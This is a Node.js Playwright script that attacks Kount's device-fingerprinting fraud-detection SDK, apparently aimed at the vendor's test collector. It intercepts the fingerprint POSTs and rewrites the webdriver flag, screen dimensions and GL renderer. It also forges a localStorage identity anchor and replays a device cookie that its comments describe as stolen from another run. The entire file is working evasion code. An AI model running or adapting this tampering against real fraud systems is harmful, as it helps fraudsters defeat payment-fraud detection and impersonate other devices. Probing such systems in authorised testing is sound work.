#!/usr/bin/env node
/** knt-tamper.mjs — intercept Kount's /md fingerprint POSTs (plaintext!) and
 *  rewrite the signals mid-flight: webdriver flag, reduced-motion, screen dims,
 *  GL renderer. Prove the TEST collector accepts the tampered payload (200).
 *  Also tests identity anchoring:
 *    A. mint: pre-seed localStorage 'ss' with a forged 32-hex anchor
 *    B. spoof: pre-set the FPCV device cookie stolen from another run
 */
import { chromium } from 'playwright';
import http from 'node:http';
import { writeFileSync, mkdirSync } from 'node:fs';

const TST = { host: 'tst.kaptcha.com', ip: '44.240.88.212' };
const MERCHANT = '700000';
const MODE = process.argv[2] || 'tamper';          // tamper | mint | spoof
const OUT = `/tmp/opencode/kount/tamper-${MODE}`;
mkdirSync(OUT, { recursive: true });

const STOLEN_FPCV = '85c84560a8a0e45289b1bbe6a6b8b432711fa9fc467014b34f30360344148a5d1adc3f68f1109ea7'; // from cap2-a run

const srv = http.createServer((req, res) => {
  res.setHeader('Content-Type', 'text/html');
  res.end(`<!doctype html><html><body>
<script src="https://${TST.host}/collect/sdk?m=${MERCHANT}"></script>
<script>
  // A. mint a fresh cross-session anchor BEFORE collection runs
  if (${MODE === 'mint'}) { localStorage.setItem('ss', 'b1bb1eb1bb1eb1bb1eb1bb1eb1bb1eb1'); }
  if (${MODE === 'spoof'}) { document.cookie = 'cdn.bluesnap.${MERCHANT}.ka.ck=${STOLEN_FPCV};path=/;SameSite=None;Secure'; }
  new ka.ClientSDK().collectData();
</script>
</body></html>`);
});
await new Promise(r => srv.listen(0, '127.0.0.1', r));
const port = srv.address().port;

const b = await chromium.launch({
  headless: true,
  args: [`--host-resolver-rules=MAP ${TST.host} ${TST.ip}, MAP ssl.kaptcha.com 35.80.101.90, MAP kaptcha.com 35.80.101.90`,
         '--disable-blink-features=AutomationControlled'],
});
const ctx = await b.newContext({ viewport: { width: 1280, height: 900 } });
const page = await ctx.newPage();

const log = [];
let tampered = 0;
await page.route('**/*', async (route) => {
  const req = route.request();
  const u = req.url();
  if (u.includes('kaptcha.com/md') && req.method() === 'POST') {
    let post = req.postData() || '';
    const orig = post;
    if (MODE === 'tamper') {
      // flip the lies: webdriver false->true, reduced-motion false->true, fake screen, fake GL
      post = post
        .replace('wd=false', 'wd=true')
        .replace('rm=false', 'rm=true')
        .replace('sd=900x1280', 'sd=1024x768')
        .replace(/gv=Google[^&]*/, 'gv=FakeVendor%20Ltd.')
        .replace(/gr=ANGLE[^&]*/, 'gr=FakeRenderer%20X1');
      tampered++;
    }
    log.push({ t: 'tampered-POST', url: u.slice(0, 120), origLen: orig.length, newLen: post.length,
               changed: orig !== post });
    await route.continue({ postData: post });
  } else {
    await route.continue();
  }
});

const respLog = [];
page.on('response', async (res) => {
  const u = res.url();
  if (u.includes('kaptcha.com')) respLog.push({ status: res.status(), url: u.slice(0, 120) });
});

await page.goto(`http://127.0.0.1:${port}/`, { waitUntil: 'domcontentloaded' });
await page.waitForTimeout(25000);
try { await page.evaluate(() => window.dispatchEvent(new Event('pagehide'))); } catch (_) {}
await page.waitForTimeout(3000);

const state = await page.evaluate(() => ({
  localStorage_ss: localStorage.getItem('ss'),
  cookie_fpcv: (document.cookie.match(/cdn\.[^=]+=([^;]+)/) || [])[1] ? (document.cookie.match(/cdn\.[^=]+=([^;]+)/)[1]).slice(0, 40) : '(none)',
  cookie: document.cookie.slice(0, 120),
  sessionId: typeof ka !== 'undefined' ? ka.sessionId : null,
})).catch(e => ({ err: String(e).slice(0, 150) }));

writeFileSync(`${OUT}/state.json`, JSON.stringify(state, null, 2));
writeFileSync(`${OUT}/log.json`, JSON.stringify({ log, respLog }, null, 2));

console.log(`=== KOUNT ${MODE.toUpperCase()} (TEST collector, merchant ${MERCHANT}) ===`);
console.log('tampered /md POSTs:', tampered);
for (const r of log.filter(x => x.t === 'tampered-POST')) console.log(`  ${r.url}  ${r.origLen}B -> ${r.newLen}B changed=${r.changed}`);
console.log('\nresponses:');
for (const r of respLog) console.log(`  ${r.status} ${r.url}`);
console.log('\nbrowser state:');
console.log(JSON.stringify(state, null, 2));
srv.close(); await b.close();
